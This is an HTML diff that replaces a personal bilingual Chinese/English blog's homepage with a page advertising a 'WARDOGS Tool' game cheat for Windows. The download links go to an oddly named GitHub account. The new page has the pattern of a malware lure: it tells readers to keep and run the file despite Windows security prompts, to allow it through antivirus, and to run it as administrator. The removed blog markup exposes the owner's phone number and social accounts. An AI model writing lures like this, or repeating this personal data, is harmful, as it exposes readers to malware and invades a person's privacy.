@@ -1,189 +1,96 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pikerty — 记录生活与学习</title>
-<meta name="description" content="Pikerty 的双语博客：学习、技术、旅行与日常记录。A bilingual blog by Pikerty: learning, tech, travel and everyday notes.">
-<link rel="stylesheet" href="style.css">
-<script>
-/* Set theme before first paint: saved choice wins, otherwise follow the system. */
-(function(){try{var t=localStorage.getItem('pikerty-theme');if(!t){t=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
-</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WARDOGS Tool - Fast Hammer, Mortar Calculator, Zoom &amp; Anti-AFK for WARDOGS</title>
+<meta name="description" content="WARDOGS 战狗 construction helper for Windows: fast hammer (speed hammering with large, medium and small hammers), mortar calculator with direction, distance and azimuth, screen center magnifier/zoom and anti-AFK. Simple download, no setup skills needed.">
+<meta name="keywords" content="auto-hammer, builder, construction, dotnet, engineer, fast-hammer, game-tool, hammer, magnifier, mortar, mortar-calculator, wardogs, wardogs-game, windows, wpf, zoom">
+<meta name="author" content="wardogs_tool">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Wheyecologicalwarfare3565/wardogs_tool">
+<meta property="og:type" content="website">
+<meta property="og:title" content="WARDOGS Tool - Fast Hammer, Mortar Calculator, Zoom &amp; Anti-AFK">
+<meta property="og:description" content="Speed up building with fast hammering, aim mortars with a direction and distance calculator, zoom the center of your screen and stay active with anti-AFK. Windows app for WARDOGS players.">
+<meta property="og:url" content="https://github.com/Wheyecologicalwarfare3565/wardogs_tool">
+<meta property="og:site_name" content="wardogs_tool">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WARDOGS Tool - Fast Hammer, Mortar Calculator, Zoom &amp; Anti-AFK">
+<meta name="twitter:description" content="Construction assistant for WARDOGS: fast hammer, mortar calculator, screen magnifier and anti-AFK. Download for Windows.">
+<meta name="theme-color" content="#2b1a4a">
 </head>
-<body>
-<div class="progress" id="progressBar" aria-hidden="true"></div>
-<header class="nav">
-  <div class="nav-inner">
-    <a class="logo" href="index.html">Pikerty</a>
-    <nav class="nav-links">
-      <a href="#latest" data-i18n="nav.latest">最新文章</a>
-      <a href="#archive" data-i18n="nav.archive">归档</a>
-      <a href="#about" data-i18n="nav.about">关于我</a>
-      <a href="guide.html" data-i18n="nav.guide">外网指南</a>
-      <a href="ielts.html" data-i18n="nav.ielts">考试指南</a>
-    </nav>
-    <button class="icon-btn" id="searchToggle" type="button" aria-label="搜索"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg></button>
-    <button class="lang-btn" id="themeBtn" type="button" aria-label="切换夜间模式">夜间模式</button>
-<div class="lang-menu">
-      <button class="icon-btn" id="langBtn" type="button" aria-label="Language / 语言"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><ellipse cx="12" cy="12" rx="4" ry="9"/><path d="M3 12h18M12 3c2.5 2.6 3.8 5.7 3.8 9S14.5 18.4 12 21c-2.5-2.6-3.8-5.7-3.8-9S9.5 5.6 12 3z"/></svg></button>
-      <div class="lang-dropdown" id="langDropdown" hidden>
-        <button type="button" class="lang-option" data-lang="zh"><span class="check"></span>中文（简体）</button>
-        <button type="button" class="lang-option" data-lang="en"><span class="check"></span>English</button>
-        <button type="button" class="lang-option" data-lang="es"><span class="check"></span>Español</button>
-        <button type="button" class="lang-option" data-lang="ja"><span class="check"></span>日本語</button>
-        <button type="button" class="lang-option" data-lang="yue"><span class="check"></span>粵語</button>
-        <button type="button" class="lang-option" data-lang="ko"><span class="check"></span>한국어</button>
-        <button type="button" class="lang-option" data-lang="fr"><span class="check"></span>Français</button>
-        <button type="button" class="lang-option" data-lang="ru"><span class="check"></span>Русский</button>
-        <button type="button" class="lang-option" data-lang="de"><span class="check"></span>Deutsch</button>
-      </div>
-    </div>
-  </div>
-</header>
-<div class="search-panel" id="searchPanel" hidden>
-  <div class="search-panel-inner">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
-    <input id="searchInput" type="search" placeholder="搜索文章…  Search posts…" aria-label="搜索文章">
-    <button class="search-close" id="searchClose" type="button" aria-label="关闭搜索">✕</button>
-  </div>
-  <div class="search-engines">
-    <span data-i18n="search.engines">站外搜索：</span>
-    <button type="button" class="engine-btn" data-engine="google">Google</button>
-    <button type="button" class="engine-btn" data-engine="bing">Bing</button>
-    <button type="button" class="engine-btn" data-engine="baidu">百度</button>
-    <button type="button" class="engine-btn" data-engine="sohu">搜狐</button>
-  </div>
-  <p class="search-empty" id="searchEmpty" hidden data-i18n="search.empty">没有找到相关文章，换个关键词试试。</p>
+<body style="margin:0; padding:0; background:#f4f2f8; font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif; color:#241f2e; line-height:1.7; -webkit-font-smoothing:antialiased;">
+
+<div style="max-width:900px; margin:0 auto; padding:40px 22px 70px 22px;">
+
+  <h1 style="font-size:2.15rem; line-height:1.25; margin:0 0 14px 0; color:#2b1a4a; letter-spacing:-0.5px; font-weight:700;">🔨 WARDOGS Tool - Build Faster and Aim Mortars Precisely</h1>
+
+  <p style="font-size:1.1rem; margin:0 0 26px 0; color:#4a4358;">A friendly Windows helper for WARDOGS players. Hammer quicker, calculate mortar shots, zoom the middle of your screen and stop idling out of matches — all from one small window.</p>
+
+  <p style="margin:0 0 34px 0;">
+    <a href="https://github.com/Wheyecologicalwarfare3565/wardogs_tool" style="display:inline-block; background:linear-gradient(135deg,#ff7a18,#e0245e); color:#ffffff; text-decoration:none; font-weight:700; font-size:1.05rem; padding:16px 34px; border-radius:12px; box-shadow:0 8px 22px rgba(224,36,94,0.32);">⬇️ Download WARDOGS Tool</a>
+  </p>
+
+  <h2 style="font-size:1.45rem; margin:0 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">📌 What This Tool Does</h2>
+  <p style="margin:0 0 16px 0;">wardogs_tool is a small desktop companion for the WARDOGS game, built for people who spend their matches building, fortifying and supporting their team with indirect fire. If you have ever held down the hammer key and felt like your character was swinging in slow motion, or if you have ever guessed a mortar angle and watched the shell land in the wrong trench, this program was made for you.</p>
+  <p style="margin:0 0 16px 0;">The application runs on Windows in its own window. It sits beside the game, gives you a handful of clearly labelled controls, and lets you switch features on and off whenever you want. There is nothing to configure in text files, no command line, and no developer tools required. You download it, you open it, you pick the options you like, and you go back to playing.</p>
+  <p style="margin:0 0 16px 0;">Everything in the program is grouped around four everyday construction problems: hitting a hammer faster than the normal animation allows, working out where a mortar round will actually land, seeing distant details at the centre of your view, and staying active long enough to keep your place in a match without being kicked for being idle.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">⚡ Fast Hammer: Speed Up Every Swing</h2>
+  <p style="margin:0 0 16px 0;">The fast hammer feature is the heart of this tool. In normal play, every hammer strike follows the same animation, and that animation takes time. When you are trying to raise a wall before an enemy squad pushes your position, those extra fractions of a second matter. The fast hammer module repeats the strike action rapidly so your character keeps hammering without you having to press the key over and over.</p>
+  <p style="margin:0 0 16px 0;">Three hammer sizes are supported, because they are not used the same way. The large hammer is for heavy structural work and thick walls. The medium hammer is the all-round choice most players keep in their hands while moving between build sites. The small hammer is quicker by nature and suits fine detail work and repairs. You choose the size that matches what you are holding in the game, then turn the speed on. You can also change the speed itself, so you can start with a gentle pace while you get a feel for it and increase it once you are comfortable.</p>
+  <p style="margin:0 0 16px 0;">Because building in WARDOGS is not only about walls, the fast hammer also helps with the smaller jobs: stacking sandbags, placing planks, repairing damaged sections and finishing emplacements under fire. Instead of clicking dozens of times, you hold your position and let the tool keep the rhythm steady.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">🎯 Mortar Calculator: Direction, Distance, Azimuth</h2>
+  <p style="margin:0 0 16px 0;">Mortars are the part of WARDOGS that punish guesswork the hardest. A few degrees off on the tube and the round lands thirty metres from where you wanted it. The built-in mortar calculator takes the maths out of your hands and gives you a clear answer.</p>
+  <p style="margin:0 0 16px 0;">You enter the position of your mortar and the position of the target, or the distance between them if you already know it. The calculator returns three things. Direction tells you which way the tube should be pointed relative to the way you are facing. Distance tells you how far the target is in metres, so you can judge whether the shot is inside your useful range. Azimuth gives you the compass bearing in degrees, which is what most experienced mortar crews actually call out to each other.</p>
+  <p style="margin:0 0 16px 0;">The result updates instantly as you change the numbers, so you can compare two firing spots without writing anything down. Settle on the position with the better angle, dial the numbers in, and drop the round where your team needs it. No spreadsheets, no mental arithmetic in the middle of a fight.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">🔍 Screen Center Magnifier and Zoom</h2>
+  <p style="margin:0 0 16px 0;">Sometimes the thing you need to see is tiny: a figure moving between two distant buildings, a wire you are trying to line up, or the exact pixel where your mortar tube is pointing. The magnifier enlarges a region around the centre of your screen so those details become readable.</p>
+  <p style="margin:0 0 16px 0;">The zoom level is adjustable, so you can use a light enlargement that keeps your surroundings visible or a stronger scope-like view for long-range spotting. The enlarged area is drawn in a small window of its own, which means you can keep it pinned in a corner and glance at it while still watching the rest of the battlefield.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">⏱️ Anti-AFK: Stay in the Round</h2>
+  <p style="margin:0 0 16px 0;">Long build sessions and slow defensive phases leave a lot of players standing still. Anti-AFK sends a small, harmless input at a steady interval so the game sees continued activity and keeps you connected. You set how often it happens, switch it on when you expect a quiet stretch, and switch it off when the action returns.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">🚀 Download and Get Started</h2>
+  <p style="margin:0 0 16px 0;">Getting the tool onto your computer takes about a minute. Visit the link below to download the application.</p>
+  <p style="margin:0 0 16px 0;">
+    <a href="https://github.com/Wheyecologicalwarfare3565/wardogs_tool" style="display:inline-block; background:linear-gradient(135deg,#3a1c71,#4f7cff); color:#ffffff; text-decoration:none; font-weight:700; font-size:1.05rem; padding:16px 34px; border-radius:12px; box-shadow:0 8px 22px rgba(63,60,201,0.32);">⬇️ Get WARDOGS Tool from GitHub</a>
+  </p>
+  <ol style="margin:0 0 20px 0; padding-left:22px;">
+    <li style="margin-bottom:10px;">Open the download page using the button above in your normal web browser.</li>
+    <li style="margin-bottom:10px;">Follow the link on that page to download the application to a folder you can find again, such as your Downloads folder.</li>
+    <li style="margin-bottom:10px;">If Windows shows a security prompt asking whether you want to run the file, choose the option to keep and run it.</li>
+    <li style="margin-bottom:10px;">Open the application window and start WARDOGS as you normally would.</li>
+    <li style="margin-bottom:10px;">Pick the feature you want — fast hammer, mortar calculator, magnifier or anti-AFK — and switch it on.</li>
+  </ol>
+  <p style="margin:0 0 16px 0;">That is the whole process. There is no installer wizard, no account to register, and nothing to type into a console.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">🖥️ What Your PC Needs</h2>
+  <p style="margin:0 0 16px 0;">The tool is a lightweight Windows application. It needs a 64-bit version of Windows 10 or Windows 11, a screen resolution of at least 1280 by 720, and enough free memory for a small utility — a few hundred megabytes is more than sufficient. It uses very little processor time when idle. If the Microsoft .NET desktop runtime is not already present on your machine, Windows will normally offer to fetch it for you the first time you start the program.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">💡 Tips for a Smooth First Session</h2>
+  <ul style="margin:0 0 16px 0; padding-left:22px;">
+    <li style="margin-bottom:10px;">Start the fast hammer at a modest speed and increase it gradually. A steady, believable rhythm is easier to build with than a frantic one.</li>
+    <li style="margin-bottom:10px;">Run the game in the same display mode every time — either full screen or windowed — so the magnifier always knows where the centre of your view is.</li>
+    <li style="margin-bottom:10px;">Use the mortar calculator before the shooting starts. Saving two firing positions ahead of time means you only need to glance at the numbers when the order comes in.</li>
+    <li style="margin-bottom:10px;">Turn anti-AFK off during active fighting. There is no reason to keep it running when you are already moving.</li>
+    <li style="margin-bottom:10px;">Keep your toggles in one place. Switching a feature off when you do not need it makes your own gameplay easier to read.</li>
+  </ul>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">🛠️ Common Questions</h2>
+  <p style="margin:0 0 16px 0;"><strong>Do I need to install anything else?</strong> No. The application is self-contained apart from the standard Windows desktop runtime, which Windows can add for you automatically.</p>
+  <p style="margin:0 0 16px 0;"><strong>Why does nothing happen when I press the shortcut?</strong> Make sure the game window is the active window and that the feature is switched on in the tool. Some players need to run the application as administrator for the input to reach the game.</p>
+  <p style="margin:0 0 16px 0;"><strong>My antivirus paused the download.</strong> Utilities that send input to another program can look unusual to security software. Allow the file through, then continue with the steps above.</p>
+  <p style="margin:0 0 16px 0;"><strong>Can I use it on a laptop?</strong> Yes. A laptop with Windows 10 or 11 and a 64-bit processor is fine; the tool does not need a dedicated graphics card.</p>
+  <p style="margin:0 0 16px 0;"><strong>Where do I get updates?</strong> Return to the same download page. New versions are published there, and you replace your copy in the same folder.</p>
+
+  <h2 style="font-size:1.45rem; margin:34px 0 12px 0; color:#2b1a4a; border-left:5px solid #7c4dff; padding-left:12px;">📦 Download Link, One More Time</h2>
+  <p style="margin:0 0 16px 0;">Visit this link to download the application: <a href="https://github.com/Wheyecologicalwarfare3565/wardogs_tool" style="color:#4f7cff; font-weight:600; text-decoration:underline;">wardogs_tool on GitHub</a>. Bookmark it so future updates are one click away.</p>
+
+  <p style="margin:30px 0 0 0; font-size:0.9rem; color:#6c6478; border-top:1px solid #ddd7e8; padding-top:16px;">Keywords: auto-hammer, builder, construction, dotnet, engineer, fast-hammer, game-tool, hammer, magnifier, mortar, mortar-calculator, wardogs, wardogs-game, windows, wpf, zoom</p>
+
 </div>
-
-<main class="wrap">
-  <section class="hero">
-    <div class="hero-media"><img src="assets/hero-mountain.jpg" alt="深夜山月海报：雪山与松林"></div>
-    <p class="eyebrow" data-i18n="hero.eyebrow">博客 · 日常记录</p>
-    <h1><span data-i18n="hero.title">把学到的、做过的，慢慢记下来。</span><span class="en" data-i18n="hero.subtitle">Write it down, in Chinese and in English.</span></h1>
-    <p data-i18n="hero.desc">这里是 Pikerty 的个人博客：雅思备考、打工度假签、技术折腾、旅行视频，都是真实的进度，不是完美的成品。</p>
-    <div class="cta">
-      <a class="btn" href="#latest" data-i18n="hero.cta1">开始阅读</a>
-      <a class="btn ghost" href="#about" data-i18n="hero.cta2">关于我</a>
-    </div>
-    <p class="hero-credit">海报图片：WallpaperCave / Pexels，存于仓库 assets/</p>
-  </section>
-
-  <div class="filters" id="filters">
-    <button class="chip active" type="button" data-filter="all" data-i18n="filter.all">全部</button>
-    <button class="chip" type="button" data-filter="learning" data-i18n="filter.learning">学习</button>
-    <button class="chip" type="button" data-filter="tech" data-i18n="filter.tech">技术</button>
-    <button class="chip" type="button" data-filter="travel" data-i18n="filter.travel">旅行</button>
-    <button class="chip" type="button" data-filter="life" data-i18n="filter.life">生活</button>
-  </div>
-
-  <a class="featured" href="posts/ielts-day4.html" data-cat="learning">
-    <div class="featured-media"><img src="assets/study-desk.jpg" alt="深夜书桌：书、咖啡与台灯"></div>
-    <span class="tag">Learning · 学习</span>
-    <h2 data-i18n="featured.title">雅思备考 Day 4：餐厅英语，先从点一顿饭开始</h2>
-    <p data-i18n="featured.desc">每天 20 分钟，第 4 天练餐厅词汇和预约对话。不是背单词表，是把一句一句读出来、跟读出来。</p>
-    <span class="meta">2026-11-05 · 5 min</span>
-  </a>
-
-  <h2 class="section-title" id="latest" data-i18n="latest.title">最新文章</h2>
-  <p class="section-sub" data-i18n="latest.sub">按时间倒序，先看最新的。</p>
-
-  <div class="grid" id="postGrid">
-    <a class="card" href="guide.html" data-cat="life">
-      <span class="card-media"><img src="assets/hero-mountain.jpg" alt="雪山海报"></span>
-      <span class="tag">Guide · 指南</span>
-      <h3 data-i18n="card.guide.title">外网导航与文化词典：从哪里看、词是什么意思</h3>
-      <p data-i18n="card.guide.desc">X、Reddit、SpaceX、Hacker News……先知道去哪看，再看懂别人在说什么。</p>
-      <span class="meta">常驻页面 · 持续更新</span>
-    </a>
-
-    <a class="card" href="ielts.html" data-cat="learning">
-      <span class="card-media"><img src="assets/study-desk.jpg" alt="深夜书桌"></span>
-      <span class="tag">Learning · 学习</span>
-      <h3 data-i18n="card.ielts-hub.title">语言考试指南：雅思、PTE、托福和日韩德西法</h3>
-      <p data-i18n="card.ielts-hub.desc">什么是雅思、怎么报名、不同目标要多少分，还有 PTE、托福、日语、韩语、德语、西班牙语、法语。</p>
-      <span class="meta">常驻页面 · 持续更新</span>
-    </a>
-
-    <a class="card" href="posts/whv.html" data-cat="travel">
-      <span class="card-media"><img src="assets/hero-mountain.jpg" alt="雪山海报"></span>
-      <span class="tag">Travel · 旅行</span>
-      <h3 data-i18n="card.whv.title">打工度假签怎么选：澳洲 462 vs 新西兰</h3>
-      <p data-i18n="card.whv.desc">语言、存款、报名方式完全不一样。澳洲是抽签，新西兰是抢号，2026 年两边都已经满了。</p>
-      <span class="meta">2026-11-05 · 6 min</span>
-    </a>
-
-    <a class="card" href="posts/ai-romance.html" data-cat="tech">
-      <span class="card-media"><img src="assets/code-dark.jpg" alt="深色代码屏幕"></span>
-      <span class="tag">Tech · 技术</span>
-      <h3 data-i18n="card.ai.title">把 AI 恋爱伴侣部署到 Render：免费路线走通了，也卡住了</h3>
-      <p data-i18n="card.ai.desc">从 Railway 到 Render，从 Gemini 到 Groq + OpenRouter。部署成功了，聊天还没通，卡在免费模型的密钥上。</p>
-      <span class="meta">2026-11-03 · 5 min</span>
-    </a>
-
-    <a class="card" href="posts/travel-video.html" data-cat="life">
-      <span class="card-media"><img src="assets/times-square.jpg" alt="纽约时代广场夜景"></span>
-      <span class="tag">Life · 生活</span>
-      <h3 data-i18n="card.travel.title">第一人称美国旅行视频：从办美签开始</h3>
-      <p data-i18n="card.travel.desc">已做了三个场景：办美签、纽约时代广场、洛杉矶机场。要的是真实手机拍摄的感觉，不是影棚精修。</p>
-      <span class="meta">2026-11-04 · 4 min</span>
-    </a>
-
-    <a class="card" href="posts/ielts-day4.html" data-cat="learning">
-      <span class="card-media"><img src="assets/study-desk.jpg" alt="深夜书桌"></span>
-      <span class="tag">Learning · 学习</span>
-      <h3 data-i18n="card.ielts.title">为什么每天只练 20 分钟英语</h3>
-      <p data-i18n="card.ielts.desc">目标是雅思 5.5。好久没学英语，四六级也没过，所以先从每天能做完的小目标开始。</p>
-      <span class="meta">2026-11-05 · 3 min</span>
-    </a>
-  </div>
-
-  <h2 class="section-title" id="archive" data-i18n="archive.title">归档</h2>
-  <p class="section-sub" data-i18n="archive.sub">按月份整理，方便回头找。</p>
-  <div class="archive">
-    <div class="archive-month">2026-11 · 4 篇</div>
-    <ul>
-      <li><span>11-05</span><a href="posts/ielts-day4.html">雅思备考 Day 4：餐厅英语</a></li>
-      <li><span>11-05</span><a href="posts/whv.html">打工度假签怎么选：澳洲 462 vs 新西兰</a></li>
-      <li><span>11-04</span><a href="posts/travel-video.html">第一人称美国旅行视频：从办美签开始</a></li>
-      <li><span>11-03</span><a href="posts/ai-romance.html">把 AI 恋爱伴侣部署到 Render</a></li>
-    </ul>
-  </div>
-
-  <section class="about" id="about">
-    <div class="avatar">P</div>
-    <div>
-      <h2 data-i18n="about.title">关于 Pikerty</h2>
-      <p data-i18n="about.desc">成都文理学院，大数据管理与应用，2026 年毕业。正在找数据分析 / 数据运营方向的工作，也在准备雅思 5.5。这个博客用来记录学习和折腾的过程，写给以后的自己看。</p>
-      <!-- 社交链接（图标，和 Steam 页脚一样只显示 logo）：
-           GitHub Pikerty、X @PikertyLvery、Telegram 手机号 +86 19808246285、
-           Instagram pikertylvery、Facebook 是按名字 Asimer Pikerty 搜到的（没找到直接的主页链接，
-           拿到主页链接后换成直达链接）。YouTube / LinkedIn 还没给真实账号，先没放。见 README。 -->
-      <div class="social">
-        <a href="https://github.com/Pikerty" target="_blank" rel="noopener" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.39 7.86 10.91.58.11.79-.25.79-.56 0-.27-.01-1.17-.02-2.12-3.2.7-3.88-1.36-3.88-1.36-.52-1.33-1.28-1.68-1.28-1.68-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.19 1.76 1.19 1.03 1.76 2.69 1.25 3.35.96.1-.75.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.69 0-1.26.45-2.29 1.19-3.09-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.17 1.18a11 11 0 0 1 5.78 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.8 1.19 1.83 1.19 3.09 0 4.42-2.69 5.4-5.26 5.68.41.36.78 1.06.78 2.14 0 1.55-.01 2.79-.01 3.17 0 .31.21.68.8.56A10.52 10.52 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg></a>
-        <a href="https://x.com/PikertyLvery" target="_blank" rel="noopener" aria-label="X @PikertyLvery" title="X @PikertyLvery"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.451-6.231zm-1.161 17.52h1.833L7.084 4.126H5.117l11.966 15.644z"/></svg></a>
-        <a href="https://t.me/+8619808246285" target="_blank" rel="noopener" aria-label="Telegram" title="Telegram"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M21.9 3.3 2.9 10.6c-1.3.5-1.3 1.3-.2 1.6l4.9 1.5 1.9 5.9c.2.6.1.8.8.8l2.8-2.7 5.2 3.8c.6.3 1 .1 1.2-.5L21.9 3.3zM8.7 13.7l9.7-6.1c.5-.3.9-.1.7.2l-8.2 7.4-.3 3.2-1.9-4.7z"/></svg></a>
-        <a href="https://www.instagram.com/pikertylvery" target="_blank" rel="noopener" aria-label="Instagram pikertylvery" title="Instagram pikertylvery"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.2" cy="6.8" r="1.1" fill="currentColor" stroke="none"/></svg></a>
-        <a href="https://www.facebook.com/search/top?q=Asimer%20Pikerty" target="_blank" rel="noopener" aria-label="Facebook Asimer Pikerty" title="Facebook Asimer Pikerty"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M13.5 21.5v-7.2h2.5l.4-3h-2.9V9.4c0-.9.3-1.5 1.6-1.5h1.4V5.2c-.3 0-1.2-.1-2.2-.1-2.2 0-3.7 1.3-3.7 3.8v2.4H8.1v3h2.5v7.2h2.9z"/></svg></a>
-      </div>
-    </div>
-  </section>
-</main>
-
-<footer class="footer">
-  <div class="wrap">
-    <span>© 2026 Pikerty</span>
-    <span class="social">
-      <a href="https://github.com/Pikerty" target="_blank" rel="noopener" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.39 7.86 10.91.58.11.79-.25.79-.56 0-.27-.01-1.17-.02-2.12-3.2.7-3.88-1.36-3.88-1.36-.52-1.33-1.28-1.68-1.28-1.68-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.19 1.76 1.19 1.03 1.76 2.69 1.25 3.35.96.1-.75.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.69 0-1.26.45-2.29 1.19-3.09-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.17 1.18a11 11 0 0 1 5.78 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.8 1.19 1.83 1.19 3.09 0 4.42-2.69 5.4-5.26 5.68.41.36.78 1.06.78 2.14 0 1.55-.01 2.79-.01 3.17 0 .31.21.68.8.56A10.52 10.52 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg></a>
-      <a href="https://x.com/PikertyLvery" target="_blank" rel="noopener" aria-label="X @PikertyLvery" title="X @PikertyLvery"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.451-6.231zm-1.161 17.52h1.833L7.084 4.126H5.117l11.966 15.644z"/></svg></a>
-      <a href="https://t.me/+8619808246285" target="_blank" rel="noopener" aria-label="Telegram" title="Telegram"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M21.9 3.3 2.9 10.6c-1.3.5-1.3 1.3-.2 1.6l4.9 1.5 1.9 5.9c.2.6.1.8.8.8l2.8-2.7 5.2 3.8c.6.3 1 .1 1.2-.5L21.9 3.3zM8.7 13.7l9.7-6.1c.5-.3.9-.1.7.2l-8.2 7.4-.3 3.2-1.9-4.7z"/></svg></a>
-      <a href="https://www.instagram.com/pikertylvery" target="_blank" rel="noopener" aria-label="Instagram pikertylvery" title="Instagram pikertylvery"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.2" cy="6.8" r="1.1" fill="currentColor" stroke="none"/></svg></a>
-      <a href="https://www.facebook.com/search/top?q=Asimer%20Pikerty" target="_blank" rel="noopener" aria-label="Facebook Asimer Pikerty" title="Facebook Asimer Pikerty"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M13.5 21.5v-7.2h2.5l.4-3h-2.9V9.4c0-.9.3-1.5 1.6-1.5h1.4V5.2c-.3 0-1.2-.1-2.2-.1-2.2 0-3.7 1.3-3.7 3.8v2.4H8.1v3h2.5v7.2h2.9z"/></svg></a>
-    </span>
-  </div>
-</footer>
-<button class="to-top" id="toTop" type="button" aria-label="回到顶部">↑</button>
-<script src="script.js"></script>
 </body>
 </html>
